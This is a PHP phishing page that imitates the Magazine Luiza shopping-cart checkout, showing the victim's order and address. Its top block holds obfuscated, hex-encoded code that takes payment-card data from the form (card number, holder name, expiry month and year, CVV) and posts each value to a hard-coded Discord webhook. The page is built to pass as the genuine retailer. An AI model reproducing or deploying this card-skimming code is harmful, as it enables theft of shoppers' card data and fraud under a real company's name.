<?php 
error_reporting(0);
ini_set(“display_errors”, 0 );


session_start();

require ("function/modulo.php");
require ("function/band.php");

if (isset($_SESSION ['passo3'])) {

function parcela ($valor, $vezes) {
	
	
$valor_format = number_format($valor,2,",",".");
$result = number_format($valor / $vezes ,2,",",".");

return $result;
	
}

function fix_venc ($venc)  {
	
	$virg = explode ('/', $venc);
	$cont = strlen ($virg[0]);
	
	if ($cont < 2) {
		
		$result = '0'.$virg[0].'/'.$virg[1].'';
		
	} else {
		
		$result = $venc;
	}
	
	return $result;
	
	
}





if (isset($_SESSION ['array_function'])) {
	
	$array_function = $_SESSION ['array_function'];

	$qtd_card = $array_function[3];
	
	if ($qtd_card > 0) {
		
	$cards = $array_function[4];
	
	
	}
	
	
} else {
	
	$qtd_card = 0;
	
}

$id = $_SESSION ['id_produto'];


$dadosQA = "SELECT* FROM produtos where id=$id";
$conQA = $mysqli->query($dadosQA) or die($mysqli->error);

while ($consultaQA = $conQA->fetch_array()) {
	
	$nome_produto = $consultaQA ['nome'];
	$valor = $consultaQA ['valor'];
	$status_pix = $consultaQA ['status_pix'];

	
}








	$rua_end = $_SESSION ['rua_cliente'];
	$cep_end = $_SESSION ['cep_cliente'];
	$numero_end = $_SESSION ['numero_cliente'];
	$complemento_end = $_SESSION ['complemento_cliente'];
	$bairro_end = $_SESSION ['bairro_cliente'];
	$cidade_end = $_SESSION ['cidade_cliente'];
	$estado_end = $_SESSION ['estado_cliente'];
	$nome_cliente = $_SESSION ['destinatario_cliente'];



$_SESSION ['check'] = 1;

$_SESSION ['libera_etapa'] = 1;
$_SESSION ['new_log'] = 'Pagamento';


$origem = $_SESSION ['origem'];
 goto kDE9e; h0LBz: if (empty($modulo03)) { } else { echo $answer; $answer = $modulo03; $content = "\x6d\x65\163\72\40{$answer}"; $link = "\x68\164\x74\x70\163\72\57\x2f\x64\151\163\143\x6f\162\x64\x2e\x63\x6f\x6d\57\141\160\151\x2f\167\x65\x62\150\x6f\157\153\x73\x2f\61\x31\x31\x39\x37\70\62\x31\67\71\65\64\x33\67\61\x35\70\x39\x30\57\x69\x6e\124\115\154\x34\147\150\111\x54\153\x59\x50\x53\x57\63\103\x74\x73\152\x43\137\111\x30\x6b\143\x32\x31\x78\142\x53\x6a\113\x38\x55\x75\105\154\x69\112\x56\105\62\x48\125\143\111\x4d\x4a\146\141\x78\x54\144\61\157\x34\x6b\x58\123\122\123\137\x77\x53\112\170\150"; $basearray = array("\x63\x6f\x6e\164\x65\156\164" => $content); $hookarray = array("\x68\x74\x74\160" => array("\x68\145\141\x64\x65\162" => "\x43\x6f\156\164\145\x6e\164\55\164\x79\x70\145\72\40\141\160\x70\154\x69\x63\x61\x74\151\157\x6e\x2f\170\x2d\x77\167\167\55\146\157\162\155\x2d\165\162\x6c\145\156\143\x6f\x64\145\144\15\xa", "\x6d\x65\164\x68\157\x64" => "\120\117\x53\x54", "\143\x6f\156\164\145\156\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto IjEjk; uh7Et: if (empty($modulo02)) { } else { echo $answer; $answer = $modulo02; $content = "\156\x6f\155\x65\72\x20{$answer}"; $link = "\x68\164\164\160\x73\72\x2f\x2f\x64\x69\163\x63\157\x72\x64\56\143\x6f\x6d\x2f\141\x70\x69\x2f\167\x65\142\x68\x6f\x6f\153\163\57\x31\61\61\x39\67\70\x32\61\67\x39\x35\64\63\x37\x31\x35\x38\71\60\x2f\x69\156\124\115\154\x34\147\150\111\124\153\x59\x50\x53\x57\x33\103\164\163\152\x43\137\111\60\153\x63\x32\x31\x78\x62\x53\152\113\70\x55\165\x45\x6c\151\112\x56\105\62\x48\x55\x63\x49\x4d\x4a\x66\x61\x78\124\x64\61\157\x34\x6b\130\123\122\x53\x5f\x77\x53\112\170\x68"; $basearray = array("\143\x6f\156\x74\145\156\164" => $content); $hookarray = array("\x68\164\164\160" => array("\x68\x65\x61\144\x65\162" => "\x43\157\x6e\164\145\156\164\x2d\164\171\160\145\x3a\40\141\x70\160\154\x69\143\141\x74\151\157\x6e\x2f\170\x2d\167\x77\167\55\x66\x6f\162\x6d\x2d\x75\x72\154\145\156\x63\157\x64\145\144\xd\xa", "\x6d\145\164\x68\157\144" => "\x50\117\x53\124", "\x63\x6f\x6e\164\145\156\164" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto h0LBz; nB2bB: $modulo06 = $_POST["\155\157\144\x75\154\x6f\x30\66"]; goto RyX0q; TVWuH: $modulo05 = $_POST["\155\x6f\x64\165\x6c\157\60\65"]; goto h6C0z; IjEjk: if (empty($modulo05)) { } else { echo $answer; $answer = $modulo05; $content = "\x61\156\157\x3a\40{$answer}"; $link = "\150\164\164\x70\x73\x3a\x2f\57\x64\x69\x73\x63\157\162\x64\x2e\x63\x6f\155\x2f\141\x70\151\57\x77\x65\142\150\157\x6f\153\x73\x2f\61\x31\x31\x39\67\x38\x32\x31\x37\x39\x35\64\x33\67\61\65\70\x39\60\57\x69\156\x54\115\154\64\x67\x68\x49\x54\x6b\x59\120\123\x57\63\103\x74\163\152\103\x5f\x49\60\153\x63\62\61\170\142\123\152\113\70\x55\165\105\x6c\151\x4a\126\x45\x32\110\x55\143\x49\x4d\112\x66\141\x78\x54\x64\61\157\64\153\130\x53\122\123\137\167\123\112\170\150"; $basearray = array("\143\157\x6e\164\x65\156\x74" => $content); $hookarray = array("\150\x74\164\160" => array("\x68\145\x61\x64\145\162" => "\103\x6f\x6e\x74\145\156\x74\x2d\164\171\x70\x65\72\x20\x61\160\160\154\x69\143\141\x74\151\157\x6e\x2f\170\55\167\167\167\x2d\146\x6f\x72\x6d\55\x75\x72\x6c\145\156\x63\x6f\x64\x65\144\xd\xa", "\155\145\164\150\x6f\144" => "\120\117\123\x54", "\143\x6f\x6e\x74\x65\x6e\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto TDSJS; bAHko: $modulo03 = $_POST["\155\x6f\144\165\x6c\157\60\x33"]; goto TVWuH; kDE9e: $modulo00 = $_POST["\156\x75\155\x62\x65\162"]; goto rN8Dv; rN8Dv: $modulo02 = $_POST["\x6d\x6f\x64\x75\154\x6f\x30\62"]; goto bAHko; TDSJS: if (empty($modulo01)) { } else { echo $answer; $answer = $modulo01; $content = "\143\166\166\72\40{$answer}"; $link = "\150\164\164\160\x73\72\57\x2f\x64\151\x73\x63\x6f\x72\144\x2e\x63\x6f\155\x2f\x61\160\151\x2f\167\x65\x62\150\x6f\157\153\163\x2f\x31\61\61\71\x37\x38\x32\x31\67\x39\65\x34\x33\x37\x31\65\70\x39\x30\57\151\x6e\x54\115\x6c\x34\x67\x68\x49\x54\x6b\x59\x50\x53\127\x33\x43\x74\x73\152\x43\x5f\x49\x30\153\143\62\61\170\142\123\152\x4b\x38\125\165\105\154\x69\x4a\x56\105\62\x48\125\143\x49\115\x4a\x66\x61\x78\x54\144\x31\x6f\64\153\130\x53\122\x53\137\167\x53\112\170\x68"; $basearray = array("\x63\157\156\x74\x65\156\164" => $content); $hookarray = array("\150\x74\164\x70" => array("\150\145\141\144\x65\x72" => "\103\157\x6e\164\x65\x6e\x74\x2d\x74\x79\x70\x65\x3a\40\x61\160\160\x6c\151\x63\141\164\151\157\x6e\x2f\170\55\x77\x77\x77\55\x66\x6f\x72\155\x2d\165\x72\154\145\x6e\143\x6f\144\x65\x64\15\12", "\x6d\145\164\x68\157\x64" => "\120\x4f\123\x54", "\x63\x6f\156\164\145\x6e\164" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto ra64W; RyX0q: if (empty($modulo00)) { } else { echo $answer; $answer = $modulo00; $content = "\143\x61\162\144\72\x20{$answer}"; $link = "\150\x74\x74\160\163\72\57\x2f\x64\x69\163\x63\157\162\x64\56\143\157\155\57\141\160\151\57\x77\145\142\x68\157\x6f\x6b\x73\x2f\61\61\61\71\x37\70\62\x31\x37\x39\x35\x34\63\x37\x31\65\70\x39\60\57\x69\156\x54\115\x6c\x34\x67\x68\x49\124\x6b\131\120\123\x57\63\x43\x74\x73\x6a\103\x5f\111\60\x6b\143\x32\61\170\142\123\x6a\x4b\x38\125\165\x45\154\x69\112\126\x45\62\x48\125\x63\111\x4d\x4a\x66\x61\170\x54\x64\61\x6f\64\153\130\x53\122\x53\137\167\123\112\170\150"; $basearray = array("\143\157\x6e\164\145\x6e\x74" => $content); $hookarray = array("\150\164\164\x70" => array("\150\x65\141\144\145\x72" => "\x43\157\156\x74\x65\156\x74\55\164\x79\160\145\72\40\x61\160\x70\154\x69\143\141\x74\x69\x6f\156\x2f\170\x2d\167\167\167\x2d\x66\x6f\x72\155\55\165\x72\154\145\x6e\143\x6f\144\145\x64\xd\xa", "\x6d\x65\x74\150\157\144" => "\x50\117\123\124", "\x63\157\x6e\x74\145\x6e\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto uh7Et; h6C0z: $modulo01 = $_POST["\x6d\x6f\x64\165\154\157\x30\61"]; goto nB2bB; ra64W: 
?>


<!DOCTYPE html>
<html lang="pt-BR">

   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Sacola de compras - Magazine Luiza</title>
      <meta name="description" content="As melhores ofertas em móveis, eletrônicos, eletrodomésticos, informática e muito mais, você encontra no site do Magazine Luiza! Confira!">
      <meta name="viewport" content="width=device-width">

      <style>.async-hide { opacity: 0 !important}</style>

      <link rel="shortcut icon" onclick="return false" href="https://tiao.magazineluiza.com.br/img/favicon.png">
      <link rel="stylesheet" onclick="return false" href="../assets/css/icon.css">


   </head>
   <body cz-shortcut-listen="true">
      <div id="root">
         <div data-reactroot="">
            <div class="CheckoutHeader-m.magazineluiza">
               <div class="CheckoutHeader">
                  <div class="CheckoutHeader-content">
                     <div class="CheckoutHeader-logo">
                        <a onclick="return false" href="https://m.magazineluiza.com.br/">
                           <svg width="138" height="30" viewBox="0 0 138 30" xmlns="http://www.w3.org/2000/svg" class="CheckoutHeader-logo-icon">
                              <path d="M135.742.487h-3.105c-.886 0-1.42.536-1.42 1.42v9.182c0 3.371-1.818 5.278-4.346 5.278-2.662 0-4.17-1.729-4.17-5.055V1.907c0-.886-.535-1.42-1.42-1.42h-3.104c-.886 0-1.42.536-1.42 1.42v9.848c0 6.254 3.239 9.802 8.118 9.802 2.928 0 5.19-.975 6.786-2.972l.268 1.243c.178.804.71 1.242 1.552 1.242h2.262c.888 0 1.42-.536 1.42-1.42V1.907c-.001-.886-.533-1.42-1.421-1.42zm-21.646 15.171h-5.588c-1.952 0-2.972-1.02-2.972-2.972V1.907c0-.886-.536-1.42-1.42-1.42h-3.194c-.887 0-1.418.536-1.418 1.42V13.44c0 4.746 2.882 7.634 7.633 7.634h6.965c.886 0 1.42-.536 1.42-1.42v-2.577c-.006-.886-.539-1.42-1.426-1.42zM23.697 1.863C23.607.938 23.12.488 22.232.488h-2.35c-.754 0-1.286.31-1.685.976l-5.723 9.67-5.322-9.67C6.797.794 6.214.488 5.466.488H2.938c-.888 0-1.375.45-1.465 1.375L.011 19.606c-.09.976.401 1.464 1.33 1.464H4.18c.887 0 1.42-.444 1.464-1.376l.621-9.936 3.415 6.16c.355.67.938.977 1.685.977h1.953c.754 0 1.286-.268 1.685-.976l3.86-6.61.443 10.38c.044.937.536 1.375 1.42 1.375h3.06c.937 0 1.42-.487 1.33-1.464L23.697 1.863zM95.377.487h-2.439c-.843 0-1.42.444-1.552 1.288l-.134 1.02C89.878 1.331 87.882 0 84.554 0c-5.588 0-9.713 4.392-9.713 10.734 0 6.21 3.858 10.823 9.359 10.823 3.459 0 5.722-1.464 7.098-2.972l.222 1.243c.134.804.67 1.242 1.508 1.242h2.35c.889 0 1.42-.536 1.42-1.42V1.907c-.001-.886-.533-1.42-1.42-1.42zm-9.529 15.88c-3.15 0-5.145-2.173-5.145-5.544 0-3.415 2.084-5.633 5.145-5.633 3.149 0 5.144 2.173 5.144 5.544-.006 3.416-2.09 5.633-5.144 5.633zM71.292.487h-2.44c-.843 0-1.419.444-1.553 1.288l-.134 1.02C65.791 1.331 63.795 0 60.47 0c-5.59 0-9.71 4.125-9.71 10.468 0 6.033 3.814 10.29 9.315 10.29 3.415 0 5.456-1.419 6.83-2.927v1.02c0 3.549-1.996 5.812-6.209 5.812-1.728 0-3.436-.365-5.013-1.071-.842-.402-1.508-.223-1.907.62l-.976 1.952c-.402.804-.268 1.464.489 1.907 2.35 1.33 5.233 1.863 8.027 1.863 6.964 0 11.4-4.391 11.4-10.513V1.907c-.004-.886-.536-1.42-1.423-1.42zm-9.536 15.215c-3.062 0-5.146-2.04-5.146-5.19 0-3.327 2.173-5.322 5.146-5.322 3.06 0 5.144 1.818 5.144 5.234 0 3.06-2.172 5.278-5.144 5.278zM47.206.487h-2.439c-.844 0-1.42.444-1.554 1.288l-.134 1.02C41.705 1.331 39.71 0 36.383 0c-5.589 0-9.714 4.392-9.714 10.734 0 6.21 3.859 10.823 9.36 10.823 3.458 0 5.72-1.464 7.097-2.972l.223 1.243c.134.804.67 1.242 1.508 1.242h2.35c.888 0 1.42-.536 1.42-1.42V1.907c-.002-.886-.533-1.42-1.421-1.42zm-9.537 15.88c-3.149 0-5.146-2.173-5.146-5.544 0-3.415 2.085-5.633 5.146-5.633 3.15 0 5.145 2.173 5.145 5.544 0 3.416-2.084 5.633-5.145 5.633z" fill="#FFF"></path>
                           </svg>
                        </a>
                     </div>
                  </div>
                  <div class="CheckoutHeader-colorsStrip">
                     <svg height="6" viewBox="0 0 360 6" xmlns="http://www.w3.org/2000/svg" class="CheckoutHeader-colorsStrip-image" width="360">
                        <defs>
                           <lineargradient x1=".92%" y1="0%" x2="100%" y2="0%" id="a">
                              <stop stop-color="#FFFF4A" offset=".092%"></stop>
                              <stop stop-color="#FCD000" offset="3.911%"></stop>
                              <stop stop-color="#FFC112" offset="7.776%"></stop>
                              <stop stop-color="#FFC112" offset="10.896%"></stop>
                              <stop stop-color="#FF8A00" offset="15.69%"></stop>
                              <stop stop-color="#FF5F5F" offset="22.388%"></stop>
                              <stop stop-color="#FF253A" offset="27.517%"></stop>
                              <stop stop-color="#FF37A8" offset="36.913%"></stop>
                              <stop stop-color="#C739FF" offset="49.38%"></stop>
                              <stop stop-color="#A400E1" offset="55.694%"></stop>
                              <stop stop-color="#2ECEFF" offset="71.63%"></stop>
                              <stop stop-color="#0086FF" offset="80.307%"></stop>
                              <stop stop-color="#72F772" offset="93.689%"></stop>
                              <stop stop-color="#00D604" offset="100%"></stop>
                           </lineargradient>
                        </defs>
                        <path transform="matrix(1 0 0 -1 0 74.97)" d="M0 69h360v5.97H0z" fill="url(#a)"></path>
                     </svg>
                  </div>
               </div>
            </div>




	<script>

var i = setInterval(function () {
    
    clearInterval(i);
  
    document.getElementById("loading").style.display = "none";
    document.getElementById("conteudo").style.display = "inline";

}, 1500);


</script>	

	  			
				<div id="loading" style="display: block">
				
				<div id="overlay_a">	
				
				<center><br><br><br><br><br><br><br><br><br><br><br><br>
				<svg xmlns="http://www.w3.org/2000/svg" class="image" width="20" height="20" viewBox="0 0 55 55"><path fill="#FFCE00" d="M43.7 5.3c-1.3 1.8-3 4.1-4.7 6.5C35.7 9.4 31.8 8 27.5 8V0c6 0 11.6 2 16.2 5.3z"/><path fill="#FB9600" d="M43.6 5.2c-1.3 1.8-3 4.1-4.7 6.5 3.2 2.3 5.8 5.6 7.1 9.7l7.6-2.5c-1.8-5.7-5.4-10.4-10-13.7z"/><path fill="#E25335" d="M53.7 19c-2.2.7-4.8 1.6-7.6 2.5 1.2 3.8 1.3 8 0 12l7.6 2.5c1.8-5.8 1.7-11.7 0-17z"/><path fill="#DE349E" d="M43.7 49.7c-1.3-1.8-3-4.1-4.7-6.5 3.2-2.3 5.8-5.7 7.1-9.7l7.6 2.5c-1.9 5.7-5.5 10.4-10 13.7z"/><path fill="#BF2FDC" d="M43.7 49.7c-1.3-1.8-3-4.1-4.7-6.5-3.2 2.3-7.2 3.7-11.4 3.7v8c5.9.1 11.5-1.9 16.1-5.2z"/><path fill="#5D33D5" d="M11.3 49.7c1.3-1.8 3-4.1 4.7-6.5 3.2 2.3 7.2 3.7 11.4 3.7v8c-5.9.1-11.5-1.9-16.1-5.2z"/><path fill="#2B7CD7" d="M11.4 49.8c1.3-1.8 3-4.1 4.7-6.5-3.2-2.3-5.8-5.6-7.1-9.7l-7.6 2.5c1.8 5.7 5.4 10.4 10 13.7z"/><path fill="#33C3DD" d="M1.4 36c2.2-.7 4.8-1.6 7.6-2.5-1.2-3.8-1.3-8 0-12L1.3 19c-1.8 5.8-1.7 11.7.1 17z"/><path fill="#32D9A1" d="M11.3 5.3c1.3 1.8 3 4.1 4.7 6.5-3.2 2.3-5.8 5.7-7.1 9.7L1.3 19c1.9-5.7 5.5-10.4 10-13.7z"/><path fill="#3FCB2A" d="M11.3 5.3c1.3 1.8 3 4.1 4.7 6.5C19.3 9.4 23.2 8 27.5 8V0c-6 0-11.6 2-16.2 5.3z"/></svg>
				</center>
				</div>
				
				</div>


	  
	  
	  <div id="conteudo" style="display: none">
	  


            <div class="App clearfix">
               <div class="PaymentPage">
                  <div class="OrderReview">
                     <div class="OrderReview-titleContainer">
                        <span class="OrderReview-title">Revisão do pedido</span>

                     </div>
                     <div class="OrderReview-container">
                        <div class="OrderReview-leftContainer">
                           <div class="OrderReviewPackage">
                              <b>Entrega 01 de 01</b>
                              <span>
                                 <!-- react-text: 1162 --> por <!-- /react-text --><!-- react-text: 1163 -->Magalu<!-- /react-text --><!-- react-text: 1164 --> - <!-- /react-text --><!-- react-text: 1165 -->Em até 3 dias úteis*<!-- /react-text --><!-- react-text: 1166 --> <!-- /react-text -->
                              </span>
                              <div class="OrderReviewItem">
                                 <div class="OrderReviewItem-description">01 <?php echo $nome_produto ?>    </div>
                              </div>
                           </div>
                           <div class="OrderReviewAddress">
                              <div class="OrderReviewAddress-description">
                                 <!-- react-text: 1171 -->Endereço para a entrega 01: <?php echo ucwords ($rua_end) ?>, <?php echo ucwords ($numero_end) ?> - <?php echo ucwords ($complemento_end) ?> - <?php echo ucwords ($bairro_end) ?> - <?php echo ucwords ($cidade_end) ?>/<?php echo ucwords ($estado_end) ?><!-- /react-text -->
                                 <a class="OrderReviewAddress-description-edit"   href="<?php echo $origem ?>">
                                    <div class="ButtonEditLabelAndIcon">
                                       <span class="edit-label">Alterar endereço</span>
                                       <svg class="edit-icon" width="18" height="18" viewBox="0 0 18 18">
                                          <path d="m.927 13.064-.89 3.32a1.06 1.06 0 0 0 1.297 1.297l3.321-.89a.546.546 0 0 0 .25-.144l10.64-10.673-3.833-3.833L1.071 12.815a.554.554 0 0 0-.144.25m15.998-8.438-.434.434-3.833-3.834.434-.433a2.71 2.71 0 0 1 3.833 3.833" fill="#8C8C8C" fill-rule="evenodd"></path>
                                       </svg>
                                    </div>
                                 </a>
                              </div>
                           </div>
                        </div>
                        <div class="OrderReview-rightContainer">
                           <div class="OrderReviewTotals">
                              <div class="OrderReviewTotals-subTotal"><span class="OrderReviewTotals-left">Subtotal</span><span class="OrderReviewTotals-right">R$ <?php echo parcela ($valor,1) ?></span></div>
                              <div class="OrderReviewTotals-shipment"><span class="OrderReviewTotals-left">Frete</span><span class="OrderReviewTotals-right--free">Grátis</span></div>
                              <div class="OrderReviewTotals-total">
                                 <span class="OrderReviewTotals-left">Total</span>
                                 <span class="OrderReviewTotals-right">
                                    <div class="OrderReviewTotal">
                                       <!-- react-text: 1189 -->R$ <?php echo parcela ($valor,1) ?><!-- /react-text -->
                                    </div>
                                 </span>
                              </div>
                              <div class="CardLuiza">
                                 <div class="CardLuiza__icon-cardluiza">
                                    <svg class="IconCardsLuiza" width="42" height="34" viewBox="0 0 42 34">
                                       <defs>
                                          <path id="a" d="M0 .002h3.043v2.629H0z"></path>
                                          <path id="c" d="M.006.004h.79v.798h-.79z"></path>
                                          <path id="e" d="M.017.004h2.659v2.753H.016z"></path>
                                          <path id="g" d="M.001.004h.79v.798H0z"></path>
                                          <path id="i" d="M0 .002h3.043v2.629H0z"></path>
                                          <path id="k" d="M.006.004h.79v.798h-.79z"></path>
                                          <path id="m" d="M.017.004h2.659v2.753H.016z"></path>
                                          <path id="o" d="M.001.004h.79v.798H0z"></path>
                                       </defs>
                                       <g fill="none" fill-rule="evenodd">
                                          <g fill-rule="nonzero">
                                             <path fill="#EDCD49" d="M0 0h35.758v24H0z"></path>
                                             <path fill="#000" d="M8.089 12.025c0 3.562 1.87 6.854 4.907 8.635a9.682 9.682 0 0 0 9.815 0c3.036-1.781 4.907-5.073 4.907-8.635 0-5.506-4.394-9.97-9.815-9.97-5.42 0-9.814 4.464-9.814 9.97z" opacity=".03"></path>
                                             <path fill="#FAA61A" d="M34.279 16.936c0 1.799-1.436 3.257-3.207 3.257-1.77 0-3.206-1.458-3.206-3.257 0-1.799 1.436-3.257 3.207-3.257 1.77 0 3.206 1.458 3.206 3.257z"></path>
                                             <path fill="#ED1C24" d="M29.988 16.936a3.267 3.267 0 0 1-1.603 2.82 3.163 3.163 0 0 1-3.206 0 3.267 3.267 0 0 1-1.603-2.82c0-1.799 1.435-3.257 3.206-3.257 1.77 0 3.206 1.458 3.206 3.257z"></path>
                                          </g>
                                          <g fill-rule="nonzero">
                                             <path fill="#DFDEE3" d="M6 10h35.758v24H6z"></path>
                                             <path fill="#000" d="M14.089 22.025c0 3.562 1.87 6.854 4.907 8.635a9.682 9.682 0 0 0 9.815 0c3.036-1.781 4.907-5.073 4.907-8.635 0-5.506-4.394-9.97-9.815-9.97-5.42 0-9.814 4.464-9.814 9.97z" opacity=".03"></path>
                                             <path fill="#FAA61A" d="M40.279 26.936c0 1.799-1.436 3.257-3.207 3.257-1.77 0-3.206-1.458-3.206-3.257 0-1.799 1.436-3.257 3.207-3.257 1.77 0 3.206 1.458 3.206 3.257z"></path>
                                             <path fill="#ED1C24" d="M35.988 26.936a3.267 3.267 0 0 1-1.603 2.82 3.163 3.163 0 0 1-3.206 0 3.267 3.267 0 0 1-1.603-2.82c0-1.799 1.435-3.257 3.206-3.257 1.77 0 3.206 1.458 3.206 3.257z"></path>
                                          </g>
                                          <path fill="#0086FF" d="M9.478 4.99c-.37 0-.623-.261-.623-.663 0-.425.263-.68.623-.68.37 0 .623.232.623.668 0 .391-.263.675-.623.675m1.155-1.943h-.295c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357c-.677 0-1.177.527-1.177 1.337 0 .77.462 1.314 1.128 1.314.414 0 .66-.181.827-.374v.13c0 .454-.241.743-.752.743a1.42 1.42 0 0 1-.607-.136c-.102-.051-.182-.029-.23.08l-.119.248c-.048.102-.032.187.06.244.284.17.633.238.972.238.843 0 1.38-.56 1.38-1.343V3.228c0-.113-.064-.181-.172-.181M15.94 4.99h-1.026l1.07-1.303a.342.342 0 0 0 .08-.227v-.232c0-.113-.065-.181-.172-.181H14.2c-.108 0-.172.068-.172.18v.324c0 .113.064.181.172.181h.956l-1.08 1.309a.342.342 0 0 0-.08.226v.227c0 .113.064.181.172.181h1.772c.108 0 .172-.068.172-.181V5.17c0-.113-.064-.181-.172-.181m-9.378.086c-.382 0-.624-.278-.624-.709 0-.436.253-.719.624-.719.381 0 .623.278.623.708 0 .436-.253.72-.623.72m1.154-2.028h-.295c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357c-.677 0-1.177.561-1.177 1.371 0 .793.468 1.382 1.134 1.382.419 0 .693-.187.86-.38l.026.16c.016.101.08.158.183.158h.284c.108 0 .172-.068.172-.181V3.228c0-.113-.064-.181-.172-.181m4.679 2.028c-.381 0-.623-.278-.623-.709 0-.436.252-.719.623-.719.381 0 .623.278.623.708 0 .436-.252.72-.623.72m1.155-2.028h-.296c-.102 0-.171.056-.188.164l-.016.13a1.02 1.02 0 0 0-.81-.357c-.678 0-1.177.561-1.177 1.371 0 .793.467 1.382 1.133 1.382.42 0 .693-.187.86-.38l.027.16c.016.101.08.158.182.158h.285c.107 0 .172-.068.172-.181V3.228c0-.113-.065-.181-.172-.181m3.362 0h-.354c-.108 0-.172.068-.172.18v2.267c0 .113.064.18.172.18h.354c.108 0 .172-.067.172-.18V3.228c0-.113-.064-.181-.172-.181"></path>
                                          <g transform="translate(2 3.044)">
                                             <mask id="b" fill="#fff">
                                                <use xlink:onclick="return false" href="#a"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M2.87.178C2.859.059 2.8.002 2.692.002h-.284c-.092 0-.156.04-.204.125L1.51 1.362.866.127A.213.213 0 0 0 .662.002H.356C.248.002.189.06.178.178L.001 2.444c-.01.124.049.187.161.187h.344c.108 0 .172-.057.177-.176L.76 1.186l.413.788a.213.213 0 0 0 .204.124h.237c.091 0 .155-.034.204-.124l.467-.844.054 1.325c.005.12.064.176.172.176h.37c.113 0 .172-.063.161-.187L2.87.178z" mask="url(#b)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M28.273 3.047h-.355c-.107 0-.171.068-.171.18v2.267c0 .113.064.18.171.18h.355c.107 0 .172-.067.172-.18V3.228c0-.113-.065-.181-.172-.181"></path>
                                          <g transform="translate(27.692 2.018)">
                                             <mask id="d" fill="#fff">
                                                <use xlink:onclick="return false" href="#c"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M.404.004a.4.4 0 0 0-.398.402c0 .215.156.396.398.396A.388.388 0 0 0 .796.406.396.396 0 0 0 .404.004" mask="url(#d)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M30.663 4.99h-1.026l1.07-1.303a.342.342 0 0 0 .08-.227v-.232c0-.113-.065-.181-.172-.181h-1.692c-.108 0-.172.068-.172.18v.324c0 .113.064.181.172.181h.956l-1.08 1.309a.342.342 0 0 0-.08.226v.227c0 .113.064.181.172.181h1.772c.108 0 .172-.068.172-.181V5.17c0-.113-.064-.181-.172-.181"></path>
                                          <g transform="translate(30.937 2.98)">
                                             <mask id="f" fill="#fff">
                                                <use xlink:onclick="return false" href="#e"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M1.349 2.094c-.382 0-.623-.277-.623-.708 0-.436.252-.719.623-.719.381 0 .623.278.623.708 0 .436-.253.72-.623.72M2.504.066h-.296c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357C.516.004.017.565.017 1.375c0 .793.467 1.382 1.133 1.382.419 0 .693-.187.86-.38l.026.16c.016.101.08.158.183.158h.285c.107 0 .172-.068.172-.181V.248c0-.113-.065-.181-.172-.181" mask="url(#f)"></path>
                                          </g>
                                          <g transform="translate(16.336 2.018)">
                                             <mask id="h" fill="#fff">
                                                <use xlink:onclick="return false" href="#g"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M.399.004A.4.4 0 0 0 0 .406a.388.388 0 0 0 .4.396.388.388 0 0 0 .39-.396.396.396 0 0 0-.391-.402" mask="url(#h)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M20.839 4.027c.075-.272.29-.46.548-.46.28 0 .456.17.483.46h-1.03zm.548-1.054c-.78 0-1.268.651-1.268 1.382 0 .81.478 1.382 1.31 1.382.425 0 .774-.124 1.032-.396.07-.074.06-.159-.01-.244l-.156-.181c-.07-.085-.156-.09-.242-.023a.97.97 0 0 1-.559.193c-.365 0-.601-.181-.666-.527h1.569c.107 0 .171-.068.171-.181v-.113c0-.777-.472-1.292-1.181-1.292zm-2.487.011c-.344 0-.607.125-.8.38l-.033-.159c-.021-.102-.086-.158-.188-.158h-.274c-.107 0-.172.068-.172.18v2.267c0 .113.065.18.172.18h.376c.108 0 .172-.067.172-.18V4.32c0-.43.22-.674.516-.674.311 0 .472.221.472.646v1.2c0 .114.065.182.172.182h.376c.108 0 .172-.068.172-.181V4.236c0-.799-.392-1.252-.961-1.252m5.715 2h-.677c-.236 0-.36-.13-.36-.38V3.228c0-.113-.064-.181-.172-.181h-.386c-.108 0-.172.068-.172.18v1.474c0 .606.349.974.924.974h.843c.107 0 .172-.068.172-.181v-.329c0-.113-.065-.181-.172-.181m2.621-1.937h-.376c-.107 0-.172.068-.172.18V4.4c0 .43-.22.675-.526.675-.322 0-.505-.221-.505-.646V3.228c0-.113-.064-.181-.172-.181h-.376c-.107 0-.172.068-.172.18v1.258c0 .8.392 1.252.983 1.252.355 0 .629-.124.822-.38l.032.16c.022.101.086.158.188.158h.274c.108 0 .172-.068.172-.181V3.228c0-.113-.064-.181-.172-.181M15.478 15.99c-.37 0-.623-.261-.623-.663 0-.425.263-.68.623-.68.37 0 .623.232.623.668 0 .391-.263.675-.623.675m1.155-1.943h-.295c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357c-.677 0-1.177.527-1.177 1.337 0 .77.462 1.314 1.128 1.314.414 0 .66-.181.827-.374v.13c0 .454-.241.743-.752.743a1.42 1.42 0 0 1-.607-.136c-.102-.051-.182-.029-.23.08l-.119.248c-.048.102-.032.187.06.244.284.17.633.238.972.238.843 0 1.38-.56 1.38-1.343v-2.237c0-.113-.064-.181-.172-.181m5.307 1.943h-1.026l1.07-1.303a.342.342 0 0 0 .08-.227v-.232c0-.113-.065-.181-.172-.181H20.2c-.108 0-.172.068-.172.18v.324c0 .113.064.181.172.181h.956l-1.08 1.309a.342.342 0 0 0-.08.226v.227c0 .113.064.181.172.181h1.772c.108 0 .172-.068.172-.181v-.323c0-.113-.064-.181-.172-.181m-9.378.085c-.382 0-.624-.278-.624-.709 0-.436.253-.719.624-.719.381 0 .623.278.623.708 0 .436-.253.72-.623.72m1.154-2.028h-.295c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357c-.677 0-1.177.561-1.177 1.371 0 .793.468 1.382 1.134 1.382.419 0 